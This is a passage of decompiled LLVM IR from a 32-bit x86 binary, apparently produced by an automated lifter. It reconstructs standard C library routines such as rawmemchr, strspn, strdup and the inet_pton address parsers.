  store i32 %v7_8053aed, i32* %edi.global-to-local, align 4
  %v0_8053aee = load i32, i32* %eax.global-to-local, align 4
  %v3_8053aee = trunc i32 %v0_8053aee to i8
  %v4_8053aee = icmp eq i8 %v3_8053aee, 0
  %v1_8053af0 = icmp eq i1 %v4_8053aee, false
  br i1 %v1_8053af0, label %dec_label_pc_8053aec.dec_label_pc_8053ae9_crit_edge, label %dec_label_pc_8053af7

dec_label_pc_8053aec.dec_label_pc_8053ae9_crit_edge: ; preds = %dec_label_pc_8053aec
  %v0_8053ae9.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053ae9 = add i32 %v0_8053ae9.pre, -1
  %v8_8053ae9 = icmp eq i32 %v1_8053ae9, 0
  store i32 %v1_8053ae9, i32* %ecx.global-to-local, align 4
  br i1 %v8_8053ae9, label %dec_label_pc_8053af4, label %dec_label_pc_8053aec

dec_label_pc_8053af4:                             ; preds = %dec_label_pc_8053aec.dec_label_pc_8053ae9_crit_edge, %entry
  %v2_8053af6.lcssa = phi i32 [ %v2_8053ae5, %entry ], [ %v7_8053aed, %dec_label_pc_8053aec.dec_label_pc_8053ae9_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8053af6 = inttoptr i32 %v2_8053af6.lcssa to i8*
  store i8 0, i8* %v3_8053af6, align 1
  %v4_8053af6 = load i32, i32* %edi.global-to-local, align 4
  %v5_8053af6 = load i1, i1* @df, align 1
  %v6_8053af6 = select i1 %v5_8053af6, i32 -1, i32 1
  %v7_8053af6 = add i32 %v6_8053af6, %v4_8053af6
  store i32 %v7_8053af6, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8053af7

dec_label_pc_8053af7:                             ; preds = %dec_label_pc_8053aec, %dec_label_pc_8053af4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_8053afb = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8053afb, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_8053ae9, { 1, 0 }
  uselistorder i32 %v0_8053aee, { 1, 0 }
  uselistorder i32 %v7_8053aed, { 0, 2, 1 }
  uselistorder i1 %v5_8053aed, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8053af7, { 1, 0 }
  uselistorder label %dec_label_pc_8053aec, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8053b01 = load i32, i32* @ebx, align 4
  %v4_8053b02 = urem i32 %arg2, 256
  %v4_8053b06 = ptrtoint i8* %arg1 to i32
  %v2_8053b114 = urem i32 %v4_8053b06, 4
  %v3_8053b115 = icmp eq i32 %v2_8053b114, 0
  %v1_8053b139 = icmp eq i1 %v3_8053b115, false
  %v4_8053b0c = trunc i32 %arg2 to i8
  br i1 %v1_8053b139, label %dec_label_pc_8053b0c, label %dec_label_pc_8053b15

dec_label_pc_8053b0c:                             ; preds = %entry, %dec_label_pc_8053b10
  %v0_8053b10 = phi i32 [ %v1_8053b10, %dec_label_pc_8053b10 ], [ %v4_8053b06, %entry ]
  %v1_8053b0c = inttoptr i32 %v0_8053b10 to i8*
  %v2_8053b0c = load i8, i8* %v1_8053b0c, align 1
  %v15_8053b0c = icmp eq i8 %v2_8053b0c, %v4_8053b0c
  br i1 %v15_8053b0c, label %dec_label_pc_8053b60, label %dec_label_pc_8053b10

dec_label_pc_8053b10:                             ; preds = %dec_label_pc_8053b0c
  %v1_8053b10 = add i32 %v0_8053b10, 1
  %v2_8053b11 = urem i32 %v1_8053b10, 4
  %v3_8053b11 = icmp eq i32 %v2_8053b11, 0
  %v1_8053b13 = icmp eq i1 %v3_8053b11, false
  br i1 %v1_8053b13, label %dec_label_pc_8053b0c, label %dec_label_pc_8053b15

dec_label_pc_8053b15:                             ; preds = %entry, %dec_label_pc_8053b10
  %v0_8053b18 = phi i32 [ %v1_8053b10, %dec_label_pc_8053b10 ], [ %v4_8053b06, %entry ]
  %v2_8053b1c = mul nuw nsw i32 %v4_8053b02, 256
  %v2_8053b1f = or i32 %v2_8053b1c, %v4_8053b02
  %v2_8053b23 = mul i32 %v2_8053b1f, 65536
  %v2_8053b26 = or i32 %v2_8053b23, %v2_8053b1f
  br label %dec_label_pc_8053b28

dec_label_pc_8053b28:                             ; preds = %dec_label_pc_8053b58, %dec_label_pc_8053b28, %dec_label_pc_8053b15
  %v0_8053b2c = phi i32 [ %v0_8053b18, %dec_label_pc_8053b15 ], [ %v1_8053b2c, %dec_label_pc_8053b28 ], [ %v1_8053b2c, %dec_label_pc_8053b58 ]
  %v2_8053b2a = inttoptr i32 %v0_8053b2c to i32*
  %v3_8053b2a = load i32, i32* %v2_8053b2a, align 4
  %v4_8053b2a = xor i32 %v3_8053b2a, %v2_8053b26
  %v1_8053b2c = add i32 %v0_8053b2c, 4
  store i32 %v1_8053b2c, i32* @ecx, align 4
  %v1_8053b2f = add i32 %v4_8053b2a, 2130640639
  %v1_8053b35 = sub i32 -1, %v4_8053b2a
  store i32 %v1_8053b35, i32* @edx, align 4
  %v2_8053b37 = xor i32 %v1_8053b2f, %v1_8053b35
  %v1_8053b39 = and i32 %v2_8053b37, -2130640640
  %v2_8053b39 = icmp eq i32 %v1_8053b39, 0
  br i1 %v2_8053b39, label %dec_label_pc_8053b28, label %dec_label_pc_8053b40

dec_label_pc_8053b40:                             ; preds = %dec_label_pc_8053b28
  %v2_8053b40 = inttoptr i32 %v0_8053b2c to i8*
  %v3_8053b40 = load i8, i8* %v2_8053b40, align 1
  %v16_8053b40 = icmp eq i8 %v3_8053b40, %v4_8053b0c
  br i1 %v16_8053b40, label %dec_label_pc_8053b60, label %dec_label_pc_8053b48

dec_label_pc_8053b48:                             ; preds = %dec_label_pc_8053b40
  %v1_8053b48 = add i32 %v0_8053b2c, 1
  %v2_8053b48 = inttoptr i32 %v1_8053b48 to i8*
  %v3_8053b48 = load i8, i8* %v2_8053b48, align 1
  %v16_8053b48 = icmp eq i8 %v3_8053b48, %v4_8053b0c
  br i1 %v16_8053b48, label %dec_label_pc_8053b60, label %dec_label_pc_8053b50

dec_label_pc_8053b50:                             ; preds = %dec_label_pc_8053b48
  %v1_8053b50 = add i32 %v0_8053b2c, 2
  %v2_8053b50 = inttoptr i32 %v1_8053b50 to i8*
  %v3_8053b50 = load i8, i8* %v2_8053b50, align 1
  %v16_8053b50 = icmp eq i8 %v3_8053b50, %v4_8053b0c
  br i1 %v16_8053b50, label %dec_label_pc_8053b60, label %dec_label_pc_8053b58

dec_label_pc_8053b58:                             ; preds = %dec_label_pc_8053b50
  %v1_8053b58 = add i32 %v0_8053b2c, 3
  %v2_8053b58 = inttoptr i32 %v1_8053b58 to i8*
  %v3_8053b58 = load i8, i8* %v2_8053b58, align 1
  %v16_8053b58 = icmp eq i8 %v3_8053b58, %v4_8053b0c
  %v1_8053b5e = icmp eq i1 %v16_8053b58, false
  br i1 %v1_8053b5e, label %dec_label_pc_8053b28, label %dec_label_pc_8053b60

dec_label_pc_8053b60:                             ; preds = %dec_label_pc_8053b0c, %dec_label_pc_8053b58, %dec_label_pc_8053b50, %dec_label_pc_8053b48, %dec_label_pc_8053b40
  %v0_8053b62 = phi i32 [ %v1_8053b58, %dec_label_pc_8053b58 ], [ %v1_8053b50, %dec_label_pc_8053b50 ], [ %v1_8053b48, %dec_label_pc_8053b48 ], [ %v0_8053b2c, %dec_label_pc_8053b40 ], [ %v0_8053b10, %dec_label_pc_8053b0c ]
  store i32 %v0_8053b01, i32* @ebx, align 4
  ret i32 %v0_8053b62

; uselistorder directives
  uselistorder i32 %v1_8053b35, { 1, 0 }
  uselistorder i32 %v1_8053b2c, { 2, 1, 0 }
  uselistorder i32 %v2_8053b1f, { 1, 0 }
  uselistorder i32 %v1_8053b10, { 1, 0, 2 }
  uselistorder i8 %v4_8053b0c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_8053b06, { 2, 1, 0 }
  uselistorder i32 %v4_8053b02, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8053b60, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8053b15, { 1, 0 }
  uselistorder label %dec_label_pc_8053b0c, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_8053b8631 = load i8, i8* %arg1, align 1
  %v4_8053b8835 = icmp eq i8 %v2_8053b8631, 0
  br i1 %v4_8053b8835, label %dec_label_pc_8053b90, label %dec_label_pc_8053b8c.lr.ph

dec_label_pc_8053b8c.lr.ph:                       ; preds = %entry
  %v3_8053b8632 = zext i8 %v2_8053b8631 to i32
  %v4_8053b86.pre = load i32, i32* @eax, align 4
  %v5_8053b8633 = and i32 %v4_8053b86.pre, -256
  %v6_8053b8634 = or i32 %v3_8053b8632, %v5_8053b8633
  %v4_8053b6d = ptrtoint i8* %arg1 to i32
  %v1_8053b7818 = inttoptr i32 %arg2 to i8*
  %v4_8053b78.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8053b8c

dec_label_pc_8053b73:                             ; preds = %dec_label_pc_8053b8c, %dec_label_pc_8053b77
  %v6_8053b7828 = phi i32 [ %v6_8053b78, %dec_label_pc_8053b77 ], [ %v6_8053b7822, %dec_label_pc_8053b8c ]
  %v2_8053b7827 = phi i8 [ %v2_8053b78, %dec_label_pc_8053b77 ], [ %v2_8053b7819, %dec_label_pc_8053b8c ]
  %v0_8053b7726 = phi i32 [ %v1_8053b77, %dec_label_pc_8053b77 ], [ %arg2, %dec_label_pc_8053b8c ]
  %v15_8053b73 = icmp eq i8 %v2_8053b8639, %v2_8053b7827
  br i1 %v15_8053b73, label %dec_label_pc_8053b80, label %dec_label_pc_8053b77

dec_label_pc_8053b77:                             ; preds = %dec_label_pc_8053b73
  %v1_8053b77 = add i32 %v0_8053b7726, 1
  store i32 %v1_8053b77, i32* @edx, align 4
  %v1_8053b78 = inttoptr i32 %v1_8053b77 to i8*
  %v2_8053b78 = load i8, i8* %v1_8053b78, align 1
  %v3_8053b78 = zext i8 %v2_8053b78 to i32
  %v5_8053b78 = and i32 %v6_8053b7828, -256
  %v6_8053b78 = or i32 %v3_8053b78, %v5_8053b78
  store i32 %v6_8053b78, i32* @ecx, align 4
  %v4_8053b7a = icmp eq i8 %v2_8053b78, 0
  %v1_8053b7c = icmp eq i1 %v4_8053b7a, false
  br i1 %v1_8053b7c, label %dec_label_pc_8053b73, label %dec_label_pc_8053b90

dec_label_pc_8053b80:                             ; preds = %dec_label_pc_8053b73
  %v1_8053b84 = add i32 %v0_8053b9137, 1
  %v1_8053b85 = add i32 %v0_8053b8538, 1
  %v1_8053b86 = inttoptr i32 %v1_8053b85 to i8*
  %v2_8053b86 = load i8, i8* %v1_8053b86, align 1
  %v3_8053b86 = zext i8 %v2_8053b86 to i32
  %v5_8053b86 = and i32 %v6_8053b8640, -256
  %v6_8053b86 = or i32 %v3_8053b86, %v5_8053b86
  %v4_8053b88 = icmp eq i8 %v2_8053b86, 0
  br i1 %v4_8053b88, label %dec_label_pc_8053b90, label %dec_label_pc_8053b8c

dec_label_pc_8053b8c:                             ; preds = %dec_label_pc_8053b8c.lr.ph, %dec_label_pc_8053b80
  %v4_8053b78.pre = phi i32 [ %v4_8053b78.pre.pre, %dec_label_pc_8053b8c.lr.ph ], [ %v6_8053b7828, %dec_label_pc_8053b80 ]
  %v6_8053b8640 = phi i32 [ %v6_8053b8634, %dec_label_pc_8053b8c.lr.ph ], [ %v6_8053b86, %dec_label_pc_8053b80 ]
  %v2_8053b8639 = phi i8 [ %v2_8053b8631, %dec_label_pc_8053b8c.lr.ph ], [ %v2_8053b86, %dec_label_pc_8053b80 ]
  %v0_8053b8538 = phi i32 [ %v4_8053b6d, %dec_label_pc_8053b8c.lr.ph ], [ %v1_8053b85, %dec_label_pc_8053b80 ]
  %v0_8053b9137 = phi i32 [ 0, %dec_label_pc_8053b8c.lr.ph ], [ %v1_8053b84, %dec_label_pc_8053b80 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8053b7819 = load i8, i8* %v1_8053b7818, align 1
  %v3_8053b7820 = zext i8 %v2_8053b7819 to i32
  %v5_8053b7821 = and i32 %v4_8053b78.pre, -256
  %v6_8053b7822 = or i32 %v3_8053b7820, %v5_8053b7821
  store i32 %v6_8053b7822, i32* @ecx, align 4
  %v4_8053b7a23 = icmp eq i8 %v2_8053b7819, 0
  %v1_8053b7c25 = icmp eq i1 %v4_8053b7a23, false
  br i1 %v1_8053b7c25, label %dec_label_pc_8053b73, label %dec_label_pc_8053b90

dec_label_pc_8053b90:                             ; preds = %entry, %dec_label_pc_8053b80, %dec_label_pc_8053b8c, %dec_label_pc_8053b77
  %v0_8053b9117 = phi i32 [ %v0_8053b9137, %dec_label_pc_8053b77 ], [ %v0_8053b9137, %dec_label_pc_8053b8c ], [ 0, %entry ], [ %v1_8053b84, %dec_label_pc_8053b80 ]
  ret i32 %v0_8053b9117

; uselistorder directives
  uselistorder i32 %v6_8053b7822, { 1, 0 }
  uselistorder i8 %v2_8053b7819, { 1, 2, 0 }
  uselistorder i32 %v1_8053b85, { 1, 0 }
  uselistorder i32 %v6_8053b78, { 1, 0 }
  uselistorder i8 %v2_8053b78, { 1, 2, 0 }
  uselistorder i32 %v1_8053b77, { 2, 1, 0 }
  uselistorder i8 %v2_8053b8631, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053b90, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8053b8c, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8053b98 = load i32, i32* @edi, align 4
  %v0_8053b99 = load i32, i32* @esi, align 4
  %v0_8053b9a = load i32, i32* @ebx, align 4
  store i32 %v0_8053b9a, i32* %stack_var_-12, align 4
  %v4_8053b9b = ptrtoint i8* %arg1 to i32
  store i32 %v4_8053b9b, i32* @edi, align 4
  %v3_8053ba3 = call i32 @strlen(i8* %arg1)
  %v1_8053ba8 = add i32 %v3_8053ba3, 1
  store i32 %v1_8053ba8, i32* @esi, align 4
  %v2_8053bae = call i32 @malloc(i32 %v1_8053ba8)
  %v1_8053bb6 = icmp eq i32 %v2_8053bae, 0
  store i32 %v2_8053bae, i32* %ebx.global-to-local, align 4
  br i1 %v1_8053bb6, label %dec_label_pc_8053bc8, label %dec_label_pc_8053bbc

dec_label_pc_8053bbc:                             ; preds = %entry
  %v0_8053bbd = load i32, i32* @esi, align 4
  %v0_8053bbe = load i32, i32* @edi, align 4
  %tmp11 = inttoptr i32 %v2_8053bae to i16*
  %v6_8053bc0 = call i32 @memcpy(i16* %tmp11, i32 %v0_8053bbe, i32 %v0_8053bbd)
  %v0_8053bc8.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053bc8

dec_label_pc_8053bc8:                             ; preds = %entry, %dec_label_pc_8053bbc
  %v0_8053bc8 = phi i32 [ 0, %entry ], [ %v0_8053bc8.pre, %dec_label_pc_8053bbc ]
  %v2_8053bca = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053bca, i32* @ebx, align 4
  store i32 %v0_8053b99, i32* @esi, align 4
  store i32 %v0_8053b98, i32* @edi, align 4
  ret i32 %v0_8053bc8

; uselistorder directives
  uselistorder i32 %v2_8053bae, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 9, 8, 7, 17, 16, 15, 1, 4, 3, 14, 13, 12, 11, 10, 6, 5, 2, 0 }
  uselistorder label %dec_label_pc_8053bc8, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* @edx, align 4
  %v0_8053bd6 = load i32, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  %v0_8053bd9 = load i32, i32* @ebx, align 4
  store i32 %v0_8053bd9, i32* %stack_var_-16, align 4
  %v0_8053bda = load i32, i32* @eax, align 4
  store i32 %v0_8053bda, i32* %ebx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v15_8053bdc = ptrtoint i32* %stack_var_-44 to i32
  %v2_8053bdf = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8053bdf, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_8053c2715 = inttoptr i32 %v0_8053bda to i8*
  %v2_8053c2716 = load i8, i8* %v1_8053c2715, align 1
  %v3_8053c2717 = sext i8 %v2_8053c2716 to i32
  store i32 %v3_8053c2717, i32* @ecx, align 4
  %v1_8053c2a18 = add i32 %v0_8053bda, 1
  store i32 %v1_8053c2a18, i32* %ebx.global-to-local, align 4
  %v1_8053c2b19 = icmp eq i8 %v2_8053c2716, 0
  store i1 %v1_8053c2b19, i1* %zf.global-to-local, align 1
  %v1_8053c2d21 = icmp eq i1 %v1_8053c2b19, false
  br i1 %v1_8053c2d21, label %dec_label_pc_8053bea, label %dec_label_pc_8053c2f

dec_label_pc_8053bea:                             ; preds = %entry, %dec_label_pc_8053c27.backedge
  %v3_8053c2723 = phi i32 [ %v3_8053c27, %dec_label_pc_8053c27.backedge ], [ %v3_8053c2717, %entry ]
  %v2_8053c2722 = phi i8 [ %v2_8053c27, %dec_label_pc_8053c27.backedge ], [ %v2_8053c2716, %entry ]
  %v1_8053bea = add nsw i32 %v3_8053c2723, -48
  store i32 %v1_8053bea, i32* @eax, align 4
  %v9_8053bed = icmp eq i8 %v2_8053c2722, 57
  store i1 %v9_8053bed, i1* %zf.global-to-local, align 1
  %v6_8053bf0 = icmp ugt i32 %v1_8053bea, 9
  br i1 %v6_8053bf0, label %dec_label_pc_8053c13, label %dec_label_pc_8053bf2

dec_label_pc_8053bf2:                             ; preds = %dec_label_pc_8053bea
  %v0_8053bf2 = load i32, i32* @esi, align 4
  %v1_8053bf2 = inttoptr i32 %v0_8053bf2 to i8*
  %v2_8053bf2 = load i8, i8* %v1_8053bf2, align 1
  %v2_8053bf5 = zext i8 %v2_8053bf2 to i32
  %v3_8053bf5 = mul nuw nsw i32 %v2_8053bf5, 10
  %v3_8053bf8 = add nsw i32 %v3_8053bf5, %v1_8053bea
  store i32 %v3_8053bf8, i32* @eax, align 4
  %v9_8053bfc = icmp eq i32 %v3_8053bf8, 255
  store i1 %v9_8053bfc, i1* %zf.global-to-local, align 1
  %v6_8053c01 = icmp ugt i32 %v3_8053bf8, 255
  br i1 %v6_8053c01, label %dec_label_pc_8053c4c, label %dec_label_pc_8053c03

dec_label_pc_8053c03:                             ; preds = %dec_label_pc_8053bf2
  %v0_8053c03 = load i32, i32* @edx, align 4
  %v1_8053c03 = icmp eq i32 %v0_8053c03, 0
  store i1 %v1_8053c03, i1* %zf.global-to-local, align 1
  %v1_8053c05 = trunc i32 %v3_8053bf8 to i8
  store i8 %v1_8053c05, i8* %v1_8053bf2, align 1
  %v0_8053c07 = load i1, i1* %zf.global-to-local, align 1
  %v1_8053c07 = icmp eq i1 %v0_8053c07, false
  br i1 %v1_8053c07, label %dec_label_pc_8053c27.backedge, label %dec_label_pc_8053c09

dec_label_pc_8053c09:                             ; preds = %dec_label_pc_8053c03
  %v0_8053c09 = load i32, i32* @edi, align 4
  %v1_8053c09 = add i32 %v0_8053c09, 1
  store i32 %v1_8053c09, i32* @edi, align 4
  %v1_8053c0a = add i32 %v0_8053c09, -3
  %v6_8053c0a = sub i32 2, %v0_8053c09
  %v7_8053c0a = and i32 %v6_8053c0a, %v1_8053c09
  %v8_8053c0a = icmp slt i32 %v7_8053c0a, 0
  %v9_8053c0a = icmp eq i32 %v1_8053c0a, 0
  store i1 %v9_8053c0a, i1* %zf.global-to-local, align 1
  %v10_8053c0a = icmp slt i32 %v1_8053c0a, 0
  %v3_8053c0d = icmp eq i1 %v10_8053c0a, %v8_8053c0a
  %v4_8053c0d = icmp eq i1 %v9_8053c0a, false
  %v5_8053c0d = and i1 %v4_8053c0d, %v3_8053c0d
  br i1 %v5_8053c0d, label %dec_label_pc_8053c4c, label %dec_label_pc_8053c0f

dec_label_pc_8053c0f:                             ; preds = %dec_label_pc_8053c09
  %v0_8053c0f = load i32, i32* @edx, align 4
  %v1_8053c0f = and i32 %v0_8053c0f, -256
  %v2_8053c0f = or i32 %v1_8053c0f, 1
  store i32 %v2_8053c0f, i32* @edx, align 4
  br label %dec_label_pc_8053c27.backedge

dec_label_pc_8053c13:                             ; preds = %dec_label_pc_8053bea
  %v9_8053c13 = icmp eq i8 %v2_8053c2722, 46
  store i1 %v9_8053c13, i1* %zf.global-to-local, align 1
  %v1_8053c16 = icmp eq i1 %v9_8053c13, false
  br i1 %v1_8053c16, label %dec_label_pc_8053c4c, label %dec_label_pc_8053c18

dec_label_pc_8053c18:                             ; preds = %dec_label_pc_8053c13
  %v0_8053c18 = load i32, i32* @edx, align 4
  %v1_8053c18 = icmp eq i32 %v0_8053c18, 0
  store i1 %v1_8053c18, i1* %zf.global-to-local, align 1
  br i1 %v1_8053c18, label %dec_label_pc_8053c4c, label %dec_label_pc_8053c1c

dec_label_pc_8053c1c:                             ; preds = %dec_label_pc_8053c18
  %v0_8053c1c = load i32, i32* @edi, align 4
  %v9_8053c1c = icmp eq i32 %v0_8053c1c, 4
  store i1 %v9_8053c1c, i1* %zf.global-to-local, align 1
  br i1 %v9_8053c1c, label %dec_label_pc_8053c4c, label %dec_label_pc_8053c21

dec_label_pc_8053c21:                             ; preds = %dec_label_pc_8053c1c
  %v0_8053c21 = load i32, i32* @esi, align 4
  %v1_8053c21 = add i32 %v0_8053c21, 1
  store i32 %v1_8053c21, i32* @esi, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @edx, align 4
  %v1_8053c24 = inttoptr i32 %v1_8053c21 to i8*
  store i8 0, i8* %v1_8053c24, align 1
  br label %dec_label_pc_8053c27.backedge

dec_label_pc_8053c27.backedge:                    ; preds = %dec_label_pc_8053c21, %dec_label_pc_8053c0f, %dec_label_pc_8053c03
  %v0_8053c27.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053c27 = inttoptr i32 %v0_8053c27.pre to i8*
  %v2_8053c27 = load i8, i8* %v1_8053c27, align 1
  %v3_8053c27 = sext i8 %v2_8053c27 to i32
  store i32 %v3_8053c27, i32* @ecx, align 4
  %v1_8053c2a = add i32 %v0_8053c27.pre, 1
  store i32 %v1_8053c2a, i32* %ebx.global-to-local, align 4
  %v1_8053c2b = icmp eq i8 %v2_8053c27, 0
  store i1 %v1_8053c2b, i1* %zf.global-to-local, align 1
  %v1_8053c2d = icmp eq i1 %v1_8053c2b, false
  br i1 %v1_8053c2d, label %dec_label_pc_8053bea, label %dec_label_pc_8053c27.dec_label_pc_8053c2f_crit_edge

dec_label_pc_8053c27.dec_label_pc_8053c2f_crit_edge: ; preds = %dec_label_pc_8053c27.backedge
  %v0_8053c2f.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053c2f

dec_label_pc_8053c2f:                             ; preds = %dec_label_pc_8053c27.dec_label_pc_8053c2f_crit_edge, %entry
  %v0_8053c2f = phi i32 [ %v0_8053c2f.pre, %dec_label_pc_8053c27.dec_label_pc_8053c2f_crit_edge ], [ 0, %entry ]
  %v10_8053c2f = icmp eq i32 %v0_8053c2f, 3
  store i1 %v10_8053c2f, i1* %zf.global-to-local, align 1
  %v7_8053c32 = icmp sgt i32 %v0_8053c2f, 3
  br i1 %v7_8053c32, label %dec_label_pc_8053c34, label %dec_label_pc_8053c4c

dec_label_pc_8053c34:                             ; preds = %dec_label_pc_8053c2f
  %v0_8053c34 = load i32, i32* @eax, align 4
  %v3_8053c3d = bitcast i32* %stack_var_-20 to i16*
  %v4_8053c3d = call i32 @memcpy(i16* %v3_8053c3d, i32 4, i32 %v0_8053c34)
  %v0_8053c47 = load i32, i32* @esp, align 4
  %v6_8053c47 = icmp eq i32 %v0_8053c47, -16
  store i1 %v6_8053c47, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8053c4e

dec_label_pc_8053c4c:                             ; preds = %dec_label_pc_8053c1c, %dec_label_pc_8053c18, %dec_label_pc_8053c13, %dec_label_pc_8053c09, %dec_label_pc_8053bf2, %dec_label_pc_8053c2f
  store i1 true, i1* %zf.global-to-local, align 1
  %v0_8053c4e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053c4e

dec_label_pc_8053c4e:                             ; preds = %dec_label_pc_8053c34, %dec_label_pc_8053c4c
  %v0_8053c4e = phi i32 [ %v15_8053bdc, %dec_label_pc_8053c34 ], [ %v0_8053c4e.pre, %dec_label_pc_8053c4c ]
  %v0_8053c55 = phi i32 [ 1, %dec_label_pc_8053c34 ], [ 0, %dec_label_pc_8053c4c ]
  %v9_8053c4e = icmp eq i32 %v0_8053c4e, -28
  store i1 %v9_8053c4e, i1* %zf.global-to-local, align 1
  %v2_8053c51 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053c51, i32* @ebx, align 4
  store i32 %v0_8053bd6, i32* @esi, align 4
  ret i32 %v0_8053c55

; uselistorder directives
  uselistorder i32 %v0_8053c2f, { 1, 0 }
  uselistorder i32 %v3_8053c27, { 1, 0 }
  uselistorder i8 %v2_8053c27, { 1, 2, 0 }
  uselistorder i1 %v9_8053c1c, { 1, 0 }
  uselistorder i32 %v1_8053c0a, { 1, 0 }
  uselistorder i32 %v3_8053bf8, { 1, 2, 0, 3 }
  uselistorder i8 %v2_8053c2722, { 1, 0 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 14, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 15 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32 255, { 4, 2, 1, 0, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_8053c4e, { 1, 0 }
  uselistorder label %dec_label_pc_8053c4c, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_8053bea, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8053c56 = load i32, i32* @ebp, align 4
  %v0_8053c57 = load i32, i32* @edi, align 4
  %v0_8053c58 = load i32, i32* @esi, align 4
  %v0_8053c59 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_8053c61 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8053c61, i32* @edi, align 4
  %v9_8053c65 = icmp eq i32 %arg1, 2
  br i1 %v9_8053c65, label %dec_label_pc_8053c75, label %dec_label_pc_8053c6a

dec_label_pc_8053c6a:                             ; preds = %entry
  %v9_8053c6a = icmp eq i32 %arg1, 10
  %v1_8053c6d = icmp eq i1 %v9_8053c6a, false
  br i1 %v1_8053c6d, label %dec_label_pc_8053e06, label %dec_label_pc_8053c85

dec_label_pc_8053c75:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_8053c61, i32* @eax, align 4
  %v3_8053c7b = call i32 @inet_pton4(i32 %v0_8053c59, i32 %v0_8053c58, i32 %v0_8053c57)
  store i32 %v3_8053c7b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053e18

dec_label_pc_8053c85:                             ; preds = %dec_label_pc_8053c6a
  %v2_8053c8a = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053c8a, i32* %eax.global-to-local, align 4
  %tmp61 = bitcast i32* %stack_var_-32 to i8*
  %v5_8053c8f = call i32 @__GI_memset(i8* %tmp61, i32 0, i32 16)
  store i32 %v5_8053c8f, i32* @ebx, align 4
  %v2_8053c96 = add i32 %v5_8053c8f, 16
  store i32 %v2_8053c96, i32* %eax.global-to-local, align 4
  %v0_8053ca0 = load i32, i32* @edi, align 4
  %v1_8053ca0 = inttoptr i32 %v0_8053ca0 to i8*
  %v2_8053ca0 = load i8, i8* %v1_8053ca0, align 1
  %v11_8053ca0 = icmp eq i8 %v2_8053ca0, 58
  %v1_8053ca3 = icmp eq i1 %v11_8053ca0, false
  br i1 %v1_8053ca3, label %dec_label_pc_8053d36, label %dec_label_pc_8053ca5

dec_label_pc_8053ca5:                             ; preds = %dec_label_pc_8053c85
  %v1_8053ca5 = add i32 %v0_8053ca0, 1
  store i32 %v1_8053ca5, i32* @edi, align 4
  %v1_8053ca6 = inttoptr i32 %v1_8053ca5 to i8*
  %v2_8053ca6 = load i8, i8* %v1_8053ca6, align 1
  %v11_8053ca6 = icmp eq i8 %v2_8053ca6, 58
  %v1_8053ca9 = icmp eq i1 %v11_8053ca6, false
  br i1 %v1_8053ca9, label %dec_label_pc_8053e16, label %dec_label_pc_8053d36

dec_label_pc_8053cbd:                             ; preds = %dec_label_pc_8053d76
  %v0_8053cbe = load i32, i32* @edi, align 4
  %v1_8053cbe = add i32 %v0_8053cbe, 1
  store i32 %v1_8053cbe, i32* @edi, align 4
